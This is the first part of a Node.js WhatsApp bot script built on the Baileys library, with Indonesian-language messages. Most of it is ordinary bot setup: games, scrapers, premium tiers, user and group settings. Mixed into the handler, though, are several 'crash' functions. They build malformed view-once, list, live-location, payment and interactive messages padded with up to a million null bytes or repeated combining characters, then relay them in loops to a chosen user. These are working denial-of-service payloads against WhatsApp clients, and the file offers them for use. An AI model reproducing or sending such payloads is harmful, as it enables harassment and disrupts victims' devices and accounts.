require('./lib/menu');
const {
	downloadContentFromMessage,
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	InteractiveMessage,
	getContentType
} = require('@whiskeysockets/baileys');
const axios = require('axios');
const cheerio = require('cheerio');
const chalk = require('chalk');
const { color } = require('./lib/color');
const cron = require('node-cron');
const didyoumean = require('didyoumean');
const fetch = require('node-fetch');
const ffmpeg = require('fluent-ffmpeg');
const fs = require('fs');
const fsx = require('fs-extra');
const gis = require('g-i-s');
const gtts = require('node-gtts');
const moment = require('moment-timezone');
const ms = require('parse-ms');
const nou = require('node-os-utils');
const os = require('os');
const path = require('path');
const PhoneNumber = require('awesome-phonenumber');
const { performance } = require('perf_hooks');
const { randomBytes } = require('crypto');
const speed = require('performance-now');
const similarity = require('similarity');
const toMS = require('ms');
const translate = require('translate-google-api');
const util = require('util');
const yts = require('yt-search');
const readmore = String.fromCharCode(8206).repeat(4001);
const { 
	igdl, 
	ttdl, 
	fbdown, 
	twitter, 
	youtube 
} = require('btch-downloader');

const { 
	addAfkUser, 
	checkAfkUser, 
	getAfkId, 
	getAfkPosition, 
	getAfkReason, 
	getAfkTime 
} = require('./lib/afk');

const { 
	addFilter, 
	addSpam, 
	isFiltered, 
	isSpam, 
	ResetSpam 
} = require('./lib/antispam');

const { 
	addPremiumUser, 
	checkPremiumUser, 
	expiredCheck, 
	getAllPremiumUser, 
	getPremiumExpired, 
	getPremiumPosition 
} = require('./lib/premium');

const { 
	exec, 
	execSync, 
	spawn 
} = require("child_process");

const { 
	toAudio, 
	toPTT, 
	toVideo 
} = require('./lib/converter');

const { 
	smsg, 
	await, 
	clockString, 
	delay, 
	enumGetKey, 
	fetchBuffer, 
	fetchJson, 
	format, 
	formatDate, 
	formatp, 
	generateProfilePicture, 
	getBuffer, 
	getGroupAdmins, 
	getRandom, 
	isUrl, 
	json, 
	logic, 
	msToDate, 
	parseMention, 
	sizeLimit, 
	runtime, 
	sleep, 
	sort, 
	toNumber 
} = require('./lib/myfunc');

const { 
	CatBox, 
	fileIO, 
	pomfCDN, 
	uploadFile
} = require('./lib/uploader');

const { 
	gameSlot, 
	gameCasinoSolo, 
	gameMerampok, 
	daily, 
	transferLimit, 
	transferUang, 
	buy, 
	setUang, 
	setLimit 
} = require('./lib/game');

const { 
	createUser,
	createServer,
	getEggStartupCommand,
	manageServer,
	deleteServer,
	deleteUser
} = require('./lib/cpanel');

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./jadibot');

const threshold = 0.72

const alightScrape = require('./lib/scrapers/alightmotion');
const BlueArchive = require('./lib/scrapers/bluearchive');
const BukaLapak = require('./lib/scrapers/bukalapak');
const chatSimi = require('./lib/scrapers/simsimi');
const fdown = require('./lib/scrapers/fdown');
const gempa = require('./lib/scrapers/bmkg');
const GDriveDl = require('./lib/scrapers/drive');
const halodoc = require('./lib/scrapers/halodoc');
const hentai = require('./lib/scrapers/hentai');
const Instagram = require('./lib/scrapers/instagram');
const jktNews = require('./lib/scrapers/jktNews');
const Kusonime = require('./lib/scrapers/kusonime');
const lyrics = require('./lib/scrapers/lyrics');
const otakuDesu = require('./lib/scrapers/otakudesu');
const pinterest = require('./lib/scrapers/pinterest');
const PlayStore = require('./lib/scrapers/playstore');
const quotesAnime = require('./lib/scrapers/quotesAnime');
const remini = require('./lib/scrapers/remini');
const savePin = require('./lib/scrapers/savepin');
const scrapeSoundCloud = require('./lib/scrapers/soundcloud');
const upscale = require('./lib/scrapers/upscale');

const { 
	ffCh, 
	ffChSkill, 
	ffNews, 
	ffPet, 
	ffPetSkill 
} = require('./lib/scrapers/freefire');

const {
	komiku,
	detail
} = require('./lib/scrapers/komiku');

const { 
	tiktokSearchVideo, 
	tiktokDownloaderVideo 
} = require('./lib/scrapers/tiktok');

const { 
	wallpaper, 
	wikimedia, 
	happymod, 
	ringtone, 
	umma, 
	githubstalk, 
	npmstalk, 
	mlstalk 
} = require('./lib/scrapers/scraper');

const afk = JSON.parse(fs.readFileSync('./src/afk.json'));
const ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'));
const bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'));
const banned = JSON.parse(fs.readFileSync('./src/data/function/banned.json'))
let blacklist = JSON.parse(fs.readFileSync('./src/data/function/blacklist.json'));
let whitelist = JSON.parse(fs.readFileSync('./src/data/function/whitelist.json'));
const premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'));
const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'));
const contacts = JSON.parse(fs.readFileSync('./src/data/role/contacts.json'));
const userNumber = JSON.parse(fs.readFileSync('./src/data/role/user.json'));

const audionye = JSON.parse(fs.readFileSync('./media/database/audio.json'));
const setiker = JSON.parse(fs.readFileSync('./media/database/sticker.json'));
const imagenye = JSON.parse(fs.readFileSync('./media/database/image.json'));
const videonye = JSON.parse(fs.readFileSync('./media/database/video.json'));

const tebakgambar = {};
const tebakgame = {};
const tebakhero = {};
const tebakff = {};
const tebakkabupaten = {};
const tebakjkt48 = {};
const tebakhewan = {};
const tebakml = {};
const tebakchara = {};
const tebaklogo = {};
const tebakaplikasi = {};
const tebakkata = {};
const asahotak = {};
const lengkapikalimat = {};
const tebakbendera = {};
const siapaaku = {};
const tebakkalimat = {};
const caklontong = {};
const susunkata = {};
const tekateki = {};
const tebakkimia = {};
const tebaklirik = {};
const tebaktebakan = {};
const mathgame = {};
const verifyNumber = {};
const enhance = {};

try {
	let rawData = fs.readFileSync(`./src/${tempatDB}`);
	global.db.data = JSON.parse(rawData) || {};
} catch (err) {
	console.error(`⚠️ Gagal memuat ${tempatDB}, menggunakan struktur default.`);
	global.db.data = {};
}

global.db.data = {
	sticker: global.db.data.sticker || {},
	database: global.db.data.database || {},
	game: global.db.data.game || {},
	others: global.db.data.others || {},
	users: global.db.data.users || {},
	rpg: global.db.data.rpg || {},
	chats: global.db.data.chats || {},
	settings: global.db.data.settings || {},
};

const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format('DD/MM/YYYY');
const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss');

let ucapanWaktu = "Selamat Malam 🌌";

if (time2 < "05:00:00") {
	ucapanWaktu = "Selamat Pagi 🌄";
} else if (time2 < "11:00:00") {
	ucapanWaktu = "Selamat Pagi 🌄";
} else if (time2 < "15:00:00") {
	ucapanWaktu = "Selamat Siang 🌅";
} else if (time2 < "18:00:00") {
	ucapanWaktu = "Selamat Sore 🌇";
} else if (time2 < "19:00:00") {
	ucapanWaktu = "Selamat Petang 🌆";
}

async function checkBandwidth() {
	let ind = 0;
	let out = 0;
	for (let i of await require("node-os-utils").netstat.stats()) {
		ind += parseInt(i.inputBytes);
		out += parseInt(i.outputBytes);
	}
	return {
		download: formatp(ind),
		upload: formatp(out),
	};
};

module.exports = sock = async (sock, m, msg, chatUpdate, store) => {
	try {
		const {
			type,
			quotedMsg,
			mentioned,
			now,
			fromMe
		} = m
		const body = m.body
		const budy = m.text
		const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : prefa
		const isCmd = body.startsWith(prefix)
		const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
		const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
		const args = body.trim().split(/ +/).slice(1);
		const botNumber = await sock.decodeJid(sock.user.id);
		const pushname = m.pushName || "No Name"
		const text = q = args.join(" ");
		const getQuoted = (m.quoted || m);
		const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		const mime = (quoted.msg || quoted).mimetype || '';
		const qmsg = (quoted.msg || quoted);

		const isMedia = /image|video|sticker|audio/.test(mime);
		const isImage = (type == 'imageMessage');
		const isVideo = (type == 'videoMessage');
		const isAudio = (type == 'audioMessage');
		const isDocument = (type == 'documentMessage');
		const isLocation = (type == 'locationMessage');
		const isContact = (type == 'contactMessage');
		const isSticker = (type == 'stickerMessage');
		const isText = (type == 'textMessage');
		const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage');
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage');
		const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage');
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage');
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage');
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage');
		const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage');
		const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage');

		const isGroup = m.key.remoteJid.endsWith('@g.us');
		const groupMetadata = m.isGroup ? await sock.groupMetadata(m.chat).catch(e => {}) : ''
		const groupName = m.isGroup ? groupMetadata.subject : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
		const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
		const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
		const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
		const isBan = banned.includes(m.sender);
		const groupOwner = m.isGroup ? groupMetadata.owner : ''
		const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
		const AntiNsfw = m.isGroup ? ntnsfw.includes(m.chat) : false

		if (m.isGroup) {
			m.metadata = await sock.groupMetadata(m.chat)
			m.admins = (m.metadata.participants.reduce((a, b) => (b.admin ? a.push({ id: b.id, admin: b.admin }) : [...a]) && a, []))
			m.isAdmin = m.admins.some((b) => b.id === m.sender)
			m.participant = m.key.participant
			m.isBotAdmin = !!m.admins.find((member) => member.id === botNumber)
		}

		const clientId = sock.user.id.split(':')[0];
		const senderbot = m.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" || sock.user.id : m.key.participant || m.key.remoteJid;
		const senderId = senderbot.split('@')[0];
		const isBot = clientId.includes(senderId);

		const isBlacklist = blacklist.includes(m.sender);
		const isWhitelist = whitelist.includes(m.sender);
		const isAfkOn = checkAfkUser(m.sender, afk)
		const isUser = userNumber.includes(m.sender);
		const isVip = db.data && db.data.users && db.data.users[m.sender] ? db.data.users[m.sender].vip : false;
		const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const isPremium = isCreator || checkPremiumUser(m.sender, premium);
		expiredCheck(sock, m, premium);

		let usernomor = await PhoneNumber('+' + m.sender.replace('@s.whatsapp.net', '')).getNumber('international');
		let ownnomor = await PhoneNumber('+' + ownerNumber.replace('@s.whatsapp.net', '')).getNumber('international');

		const fm = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "0@s.whatsapp.net"
				} : {})
			},
			message: {
				conversation: prefix + command
			}
		};

		const fconver = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "0@s.whatsapp.net"
				} : {})
			},
			message: {
				conversation: `👤 *${pushname}*\n📞 *${usernomor}*`
			}
		};

		const fmen = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "0@s.whatsapp.net"
				} : {})
			},
			message: {
				conversation: `📝 *Pesan Menfess Baru!* ✨`
			}
		};

		async function newReply(teks) {
			if (typereply === 'v1') {
				m.reply(teks);
			} else if (typereply === 'v2') {
				sock.sendMessage(m.chat, {
					contextInfo: {
						mentionedJid: sock.mentionedJid(teks),
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							previewType: "PHOTO",
							thumbnailUrl: imageUrl,
							sourceUrl: wagc
						}
					},
					text: teks
				}, {
					quoted: m
				});
			} else if (typereply === 'v3') {
				sock.sendMessage(m.chat, {
					text: teks,
					contextInfo: {
						mentionedJid: sock.mentionedJid(teks),
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: botName,
							body: ownerName,
							thumbnailUrl: imageUrl,
							sourceUrl: website,
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, { 
					quoted: m 
				});
			} else if (typereply === 'v4') {
				const newrep = {
					contextInfo: {
						mentionedJid: sock.mentionedJid(teks),
						forwardingScore: 999999, 
						isForwarded: true, 
						forwardedNewsletterMessageInfo: {
							newsletterName: saluranName,
							newsletterJid: saluran,
						},
						externalAdReply: {
							showAdAttribution: true,
							title: ucapanWaktu,
							body: botName,
							thumbnailUrl: imageUrl,
							sourceUrl: website
						}
					},
					text: teks
				};
				return sock.sendMessage(m.chat, newrep, {
					quoted: m,
				});
			}
		};

		function capitalizeWords(str) {
			return str
				.split(' ')
				.map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
				.join(' ');
		}

		const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		};

		async function getGroupName(jid) {
			try {
				let res = await sock.groupMetadata(jid)
				return res.subject
			} catch (err) {
				return 'Anonim'
			}
		};

		function randomNomor(min, max = null) {
			if (max !== null) {
				min = Math.ceil(min);
				max = Math.floor(max);
				return Math.floor(Math.random() * (max - min + 1)) + min;
			} else {
				return Math.floor(Math.random() * min) + 1
			}
		};

		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x);

			let user = db.data.users[m.sender] || {};
			if (typeof user !== 'object') db.data.users[m.sender] = {};
	
			let isPremium = checkPremiumUser(m.sender, premium);
			let limitUser = user.vip ? global.limit.vip : isPremium ? global.limit.premium : global.limit.free;
			let uangUser = user.vip ? global.uang.vip : isPremium ? global.uang.premium : global.uang.free;

			if (!('rpg' in user)) user.rpg = false;
			if (!('daftar' in user)) user.daftar = false;
			if (!('vip' in user)) user.vip = false;
			if (!('badword' in user)) user.badword = 0;
			if (!('title' in user)) user.title = '';
			if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex');
			if (!('nick' in user)) user.nick = sock.getName(m.sender);
			if (!('nama' in user)) user.nama = 'Guest';
			if (!('pacar' in user)) user.pacar = '';
			if (!('askot' in user)) user.askot = '';
			if (!isNumber(user.umur)) user.umur = 0;
			if (!isPremium) user.premium = false;
			if (!('totalLimit' in user)) user.totalLimit = limitUser;
			if (!isNumber(user.limit)) user.limit = limitUser;
			if (!('uang' in user)) user.uang = uangUser;
			if (!('lastclaim' in user)) user.lastclaim = new Date().getTime();
			if (!('lastrampok' in user)) user.lastrampok = new Date().getTime();
			if (!('pctime' in user)) user.pctime = '';
			if (!isNumber(user.coins)) user.coins = 0
			if (!isNumber(user.uang)) user.uang = 0
			if (!isNumber(user.exp)) user.exp = 0
			if (!isNumber(user.rank)) user.rank = 700
			if (!isNumber(user.level)) user.level = 0

			db.data.users[m.sender] = user;

			let rpg = db.data.rpg[m.sender] || {};
			if (typeof rpg !== 'object') db.data.rpg[m.sender] = {};

			if (!('kapal' in rpg)) rpg.kapal = false
			if (!('darahkapal' in rpg)) rpg.darahkapal = 100
			if (!('pickaxe' in rpg)) rpg.pickaxe = false
			if (!('darahpickaxe' in rpg)) rpg.darahpickaxe = 100
			if (!('kapak' in rpg)) rpg.kapak = false
			if (!('darahkapak' in rpg)) rpg.darahkapak = 100
			if (!('bzirah' in rpg)) rpg.bzirah = false
			if (!('darahbzirah' in rpg)) rpg.darahbzirah = 100
			if (!('pedang' in rpg)) rpg.pedang = false
			if (!('darahpedang' in rpg)) rpg.darahpedang = 100
			if (!('darahuser' in rpg)) rpg.darahuser = 100
			if (!('rumah' in rpg)) rpg.rumah = 0
			if (!('besi' in rpg)) rpg.besi = 4
			if (!('kayu' in rpg)) rpg.kayu = 2
			if (!('emas' in rpg)) rpg.emas = 0
			if (!('perak' in rpg)) rpg.perak = 0
			if (!('batubara' in rpg)) rpg.batubara = 0
			if (!('bulu' in rpg)) rpg.bulu = 0
			if (!('kain' in rpg)) rpg.kain = 0
			if (!('wilayah' in rpg)) rpg.wilayah = "Indonesia"
			if (!('wilayahrumah' in rpg)) rpg.wilayahrumah = "Indonesia"
			if (!('musuh' in rpg)) rpg.musuh = 0
			if (!('ikan' in rpg)) rpg.ikan = 0
			if (!('domba' in rpg)) rpg.domba = 0
			if (!('sapi' in rpg)) rpg.sapi = 0
			if (!('ayam' in rpg)) rpg.ayam = 0
			if (!('bank' in rpg)) rpg.bank = 0
			if (!('burutime' in rpg)) rpg.burutime = 0
			if (!('lastclaim' in rpg)) rpg.lastclaim = 0
			if (!('lastdagang' in rpg)) rpg.lastdagang = 0
			if (!('lastbansos' in rpg)) rpg.lastbansos = 0
			if (!('lastkerja' in rpg)) rpg.lastkerja = 0
			if (!('lastrampok' in rpg)) rpg.lastrampok = 0

			db.data.rpg[m.sender] = rpg;

			let chats = db.data.chats[m.chat] || {};
			if (typeof chats !== 'object') db.data.chats[m.chat] = {};

			if (!('badword' in chats)) chats.badword = false;
			if (!('antiforeignnum' in chats)) chats.antiforeignnum = false;
			if (!('antiviewonce' in chats)) chats.antiviewonce = false;
			if (!('autoaipc' in chats)) chats.autoaipc = false;
			if (!('autoaigc' in chats)) chats.autoaigc = false;
			if (!('antibot' in chats)) chats.antibot = false;
			if (!('antispam' in chats)) chats.antispam = false;
			if (!('antimedia' in chats)) chats.antimedia = false;
			if (!('antiimage' in chats)) chats.antiimage = false;
			if (!('antivideo' in chats)) chats.antivideo = false;
			if (!('antiaudio' in chats)) chats.antiaudio = false;
			if (!('antisticker' in chats)) chats.antisticker = false;
			if (!('anticontact' in chats)) chats.anticontact = false;
			if (!('antilocation' in chats)) chats.antilocation = false;
			if (!('antidocument' in chats)) chats.antidocument = false;
			if (!('antilink' in chats)) chats.antilink = false;
			if (!('antilinkgc' in chats)) chats.antilinkgc = false;
			if (!('mute' in chats)) chats.mute = false;
			if (!('liststore' in chats)) chats.liststore = {};

			db.data.chats[m.chat] = chats;

			let setting = db.data.settings[botNumber] || {};
			if (typeof setting !== 'object') db.data.settings[botNumber] = {};

			if (!('totalhit' in setting)) setting.totalhit = 0;
			if (!('totalError' in setting)) setting.totalError = 0;
			if (!('online' in setting)) setting.online = false;
			if (!('safesearch' in setting)) setting.safesearch = false;
			if (!('autosticker' in setting)) setting.autosticker = false;
			if (!('autodownload' in setting)) setting.autodownload = false;
			if (!('autobio' in setting)) setting.autobio = false;
			if (!('autoread' in setting)) setting.autoread = false;
			if (!('autorecordtype' in setting)) setting.autorecordtype = false;
			if (!('autorecord' in setting)) setting.autorecord = false;
			if (!('autotype' in setting)) setting.autotype = false;
			if (!('autoblocknum' in setting)) setting.autoblocknum = false;
			if (!('onlygc' in setting)) setting.onlygc = false;
			if (!('onlypc' in setting)) setting.onlypc = false;
			if (!('watermark' in setting)) setting.watermark = { packname: global.packname, author: global.author };
			if (!('about' in setting)) setting.about = {
				bot: { nick: sock.getName(botNumber), alias: botName },
				owner: { nick: sock.getName(ownerNumber + '@s.whatsapp.net'), alias: ownerNumber }
			};

			db.data.settings[botNumber] = setting;

		} catch (err) {
			console.error('⚠️ Terjadi kesalahan:', err);
		}

		const react = async () => {
			const emojis = ["🌷", "🤙", "😂", "🤣", "😭", "🫂", "💔", "😡"]; 
			for (const emoji of emojis) {
				await sleep(80);
				await sock.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
			}
			await sleep(50);
			const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
			await sock.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
		};

		async function sendRepeatedMessages(jid, count) {
			for (let i = 0; i < count; i++) {
			 sock.sendMessage(recipientJid, {
					'text': ''.repeat(50000)
				}, {
					'participant': {
						'jid': jid
					},
					'messageId': etc.key.id
				}, {
					'quoted': m
				});
			}
		}

		async function sendViewOnceMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				let messageContent = generateWAMessageFromContent(jid, {
					'viewOnceMessage': {
						'message': {
							'messageContextInfo': {
								'deviceListMetadata': {},
								'deviceListMetadataVersion': 2
							},
							'interactiveMessage': proto.Message.InteractiveMessage.create({
								'body': proto.Message.InteractiveMessage.Body.create({
									'text': ''
								}),
								'footer': proto.Message.InteractiveMessage.Footer.create({
									'text': ''
								}),
								'header': proto.Message.InteractiveMessage.Header.create({
									'title': '',
									'subtitle': '',
									'hasMediaAttachment': false
								}),
								'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
									'buttons': [{
										'name': "cta_url",
										'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
									}],
									'messageParamsJson': "\0".repeat(100000)
								})
							})
						}
					}
				}, {});
				sock.relayMessage(jid, messageContent.message, {
					'messageId': messageContent.key.id
				});
			}
		}

		async function sendSystemCrashMessage(jid) {
			let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'subtitle': " "
							},
							'body': {
								'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
							},
							'footer': {
								'text': 'xp'
							},
							'nativeFlowMessage': {
								'buttons': [{
									'name': 'cta_url',
									'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :	}"
								}],
								'messageParamsJson': "\0".repeat(1000000)
							}
						}
					}
				}
			}), {
				'userJid': jid
			});
			await sock.relayMessage(jid, messageContent.message, {
				'participant': {
					'jid': jid
				},
				'messageId': messageContent.key.id
			});
		}
		async function sendListMessage(jid) {
			let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
				'listMessage': {
					'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
					'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
					'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
					'buttonText': null,
					'listType': 2,
					'productListInfo': {
						'productSections': [{
							'title': "lol",
							'products': [{
								'productId': "4392524570816732"
							}]
						}],
						'productListHeaderImage': {
							'productId': "4392524570816732",
							'jpegThumbnail': null
						},
						'businessOwnerJid': "0@s.whatsapp.net"
					}
				},
				'footer': "lol",
				'contextInfo': {
					'expiration': 600000,
					'ephemeralSettingTimestamp': "1679959486",
					'entryPointConversionSource': "global_search_new_chat",
					'entryPointConversionApp': "whatsapp",
					'entryPointConversionDelaySeconds': 9,
					'disappearingMode': {
						'initiator': "INITIATED_BY_ME"
					}
				},
				'selectListType': 2,
				'product_header_info': {
					'product_header_info_id': 292928282928,
					'product_header_is_rejected': false
				}
			}), {
				'userJid': jid
			});
	
			await sock.relayMessage(jid, messageContent.message, {
				'participant': {
					'jid': jid
				},
				'messageId': messageContent.key.id
			});
		}

		async function sendLiveLocationMessage(jid) {
			let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'liveLocationMessage': {
							'degreesLatitude': 'p',
							'degreesLongitude': 'p',
							'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
							'sequenceNumber': '0',
							'jpegThumbnail': ''
						}
					}
				}
			}), {
				'userJid': jid
			});
	
			await sock.relayMessage(jid, messageContent.message, {
				'participant': {
					'jid': jid
				},
				'messageId': messageContent.key.id
			});
		}

		async function sendExtendedTextMessage(jid) {
			sock.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
		}
		async function sendPaymentInvite(jid) {
			sock.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
		}

		async function sendMultiplePaymentInvites(jid, count) {
			for (let i = 0; i < count; i++) {
				sendPaymentInvite(jid);
				sendExtendedTextMessage(jid);
				await sleep(500);
			}
		}

		async function sendVariousMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				sendListMessage(jid);
				sendLiveLocationMessage(jid);
				sendSystemCrashMessage(jid);
				await sleep(500);
			}
		}

		async function sendRepeatedMessages2(jid, count) {
			for (let i = 0; i < count; i++) {
				sendSystemCrashMessage(jid);
				sendSystemCrashMessage(jid);
				sendSystemCrashMessage(jid);
				await sleep(500);
			}
		}

		async function sendMixedMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				sendLiveLocationMessage(jid);
				sendListMessage(jid);
				await sleep(500);
			}
		}

		function sendMessageWithMentions(text, mentions = [], quoted = false) {
			if (quoted == null || quoted == undefined || quoted == false) {
				return sock.sendMessage(m.chat, {
					'text': text,
					'mentions': mentions
				}, {
					'quoted': m
				});
			} else {
				return sock.sendMessage(m.chat, {
					'text': text,
					'mentions': mentions
				}, {
					'quoted': m
				});
			}
		}

		async function editp(teks1, teks2, teks3) {
			let nedd = [
				`${teks1}`,
				`${teks2}`,
				`${teks3}`
			]
			let {
				key
			} = await sock.sendMessage(m.chat, {
				text: '*Memuat...*'
			}, {
				quoted: m
			})

			for (let i = 0; i < nedd.length; i++) {
				await sleep(2000)
				await sock.sendMessage(m.chat, {
					text: nedd[i],
					edit: key
				});
			}
		}

		async function loading() {
			const lod = [
				"█▒▒▒▒▒▒▒▒▒▒▒ 10%",
				"████▒▒▒▒▒▒▒▒ 30%",
				"███████▒▒▒▒▒ 50%",
				"██████████▒▒ 80%",
				"████████████ 100%"
			];
			const { key } = await sock.sendMessage(m.chat, { 
				text: mess.wait 
			}, { 
				quoted: m 
			});

			for (let i = 0; i < lod.length; i++) {
				await sleep(600);
				await sock.sendMessage(m.chat, { 
					text: lod[i], 
					edit: key 
				});
			}
		};

		async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
			const { default: { Image } } = await import('node-webpmux');
			const img = new Image();

			const json = {
				'sticker-pack-id': 'Natsxe',
				'sticker-pack-name': packname,
				'sticker-pack-publisher': author,
				'emojis': categories,
				'is-avatar-sticker': 1,
				...extra
			};

			let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
			let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8');
			let exif = Buffer.concat([exifAttr, jsonBuffer]);

			exif.writeUIntLE(jsonBuffer.length, 14, 4);

			await img.load(buffer);
			img.exif = exif;

			return await img.save(null);
		}

		function generateRandomPassword(length) {
			let result = '';
			const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
			const charactersLength = characters.length;

			for (let i = 0; i < length; i++) {
				result += characters.charAt(Math.floor(Math.random() * charactersLength));
			}

			return result;
		};

		async function generateRandomHexName(length) {
			return randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
		};

		function formatBytes(bytes) {
			if (bytes === 0) return '0 Byte';

			const k = 1024;
			const sizes = ['Byte', 'KB', 'MB', 'GB', 'TB'];
			const i = Math.floor(Math.log(bytes) / Math.log(k));

			return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
		}

		function formatDuration(ms) {
			let seconds = Math.floor((ms / 1000) % 60);
			let minutes = Math.floor((ms / (1000 * 60)) % 60);
			let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
			return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
		}

		function formatAngka(angka, options = {}) {
			const {
				locale = 'id-ID',	// Default pakai format Indonesia
				style = 'decimal',   // Bisa 'decimal', 'currency', atau 'percent'
				currency = 'IDR',	// Default ke IDR jika style 'currency'
				minimumFractionDigits = 0, // Minimal angka di belakang koma
				maximumFractionDigits = 2  // Maksimal angka di belakang koma
			} = options;

			return new Intl.NumberFormat(locale, {
				style: style,
				currency: currency,
				minimumFractionDigits: minimumFractionDigits,
				maximumFractionDigits: maximumFractionDigits
			}).format(angka);
		};

		if (!m.isGroup && !isCreator && !isPremium && db.data.settings[botNumber].onlygc) {
			if (command) {
				let captionText = "⚠️ *「 WARNING 」* ⚠️\n";
				captionText += "Hai! 👋 Bot ini hanya bisa digunakan di grup.\n\n";
				captionText += "🤔 Ingin bot aktif di grup Kamu?\n";
